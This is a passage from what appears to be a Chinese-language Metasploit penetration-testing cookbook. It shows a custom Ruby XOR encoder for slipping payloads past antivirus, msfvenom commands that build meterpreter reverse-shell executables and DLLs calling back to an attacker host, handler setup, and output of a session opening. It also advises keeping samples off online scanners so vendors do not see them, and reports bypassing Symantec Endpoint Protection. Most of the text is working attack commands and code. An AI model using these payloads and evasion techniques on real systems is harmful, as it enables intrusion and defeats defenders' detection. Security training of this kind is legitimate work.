  L\") # size payload\nstub << state.buf[0,10]\n```\n\n\n\n```\nstub << \"\\xE8\\\
  xAB\\xFF\\xFF\\xFF\"\n    return stub\nend\n\ndef encode_block(state, block)\n \
  \   key = rand(4294967295)\n    encoded = \"\"\n    key_tab = [key].pack('l<')\n\
  \    i=0\n    block.unpack('C*').each do |ch|\n        octet = key_tab[i%4]\n  \
  \      t = ch.ord ^ octet.ord\n        encoded += t.chr\n        i+=1\n    end\n\
  \    return encoded\nend\nend\n```\n\n使用编码器时，将其复制到 /usr/share/metasploit-framework/modules/encoders/x86\
  \ 文件夹中，并命名为 bf_xor.rb。\n\n5. 现在我们已经准备好自定义编码器，可以使用它来编码我们的有效载荷并绕过安全解决方案：\n\n```\n\
  root@kali:~# msfvenom -p windows/meterpreter\n/reverse_tcp LHOST=192.168.216.5 -f\
  \ exe-only\n-e x86/bf_xor -o bf_xor.exe\nNo platform was selected, choosing Msf::Module::\n\
  :Platform::Windows from the payload\nNo Arch selected, selecting Arch: x86 from\n\
  the payload\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations\n\
  of x86/bf_xor\nx86/bf_xor succeeded with size 526 (iteration=0)\nx86/bf_xor chosen\
  \ with final size 526\nPayload size: 526 bytes\nFinal size of exe-only file: 73802\
  \ bytes\nSaved as: bf_xor.exe\nroot@kali:~#\n```\n\n## 还有更多...\n\n在测试有效载荷时，我们绝不应使用在线扫描器，例如\
  \ VirusTotal。它们会将样本与反病毒厂商和安全公司共享，以便他们改进服务和产品。这就是为什么在测试你的有效载荷时，你应该对目标进行适当的侦察，识别所使用的安全解决方案，然后在虚拟机上安装该产品，禁用客户端遥测提交，并安全地测试你的有效载荷。在本教程中，我已在\
  \ Symantec Endpoint Protection 12 上安装并测试了有效载荷：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_609_0.png)\n\
  \n这一次，我们成功绕过了反病毒解决方案：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_610_0.png)\n\n\
  ## 输出格式\n\n现在我们已经学习了 msfvenom 的基本用法，让我们探索一些可用的输出格式。本章开头，我们使用 --help-formats 选项列出了所有可用的输出格式；现在我们将重点关注一些不同的类型和选项。\n\
  \n## 如何操作...\n\n我们将首先查看 dll 输出格式及其使用方法。DLL 代表 dynamic-link library，即动态链接库，是 Microsoft\
  \ 对共享库概念的实现，意味着它们是可以导入到应用程序中的函数库。\n\n- 1. 首先，我们将使用 dll 作为输出格式生成有效载荷并设置监听器：\n\n```\n\
  root@kali:~# msfconsole -q\nmsf > msfvenom -p windows/meterpreter/reverse_https\
  \ LHOST=192.168.216.5 -f dll -o inject.dll\n[*] exec: msfvenom -p windows/meterpreter\n\
  /reverse_https LHOST=192.168.216.5 -f dll -o inject.dll\n\nNo platform was selected,\
  \ choosing Msf::Module::\n:Platform::Windows from the payload\nNo Arch selected,\
  \ selecting Arch: x86 from\nthe payload\nNo encoder or badchars specified, outputting\n\
  raw payload\nPayload size: 426 bytes\nFinal size of dll file: 5120 bytes\nSaved\
  \ as: inject.dll\nmsf > use exploit/multi/handler\nmsf exploit(multi/handler) >\
  \ set PAYLOAD\nwindows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\n\
  msf exploit(multi/handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf\
  \ exploit(multi/handler) > run\n\n[*] Started HTTPS reverse handler on\nhttps://192.168.216.5:8443\n\
  ```\n\n2. 与可执行文件不同，我们需要使用另一个应用程序来加载我们的 DLL 有效载荷。在此示例中，我们将使用 rundll32.exe 来加载库并运行\
  \ shellcode。要加载 DLL，请使用 rundll32.exe，后跟我们创建的 DLL 以及入口点名称 main：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_611_0.png)\n\
  \n```\nmsf exploit(multi/handler) > run\n\n[*] Started HTTPS reverse handler on\n\
  https://192.168.216.5:8443\n[*] https://192.168.216.5:8443 handling request\nfrom\
  \ 192.168.216.10; (UUID: xarfcvfr) Staging\nx86 payload (180825 bytes) ...\n[*]\
  \ Meterpreter session 1 opened\n(192.168.216.5:8443 -> 192.168.216.10:50589)\nat\
  \ 2017-12-15 15:08:45 +0000\n\nmeterpreter >\n```\n\n太好了，正如我们所预期的那样，我们使用 DLL 有效载荷获得了一个新会话。\n\
  \nMSFvenom 可以帮助我们创建具有隐蔽能力的有效载荷，利用高级 shell，例如 meterpreter，并在进行 Web 应用程序渗透测试时使用编码器。\n\
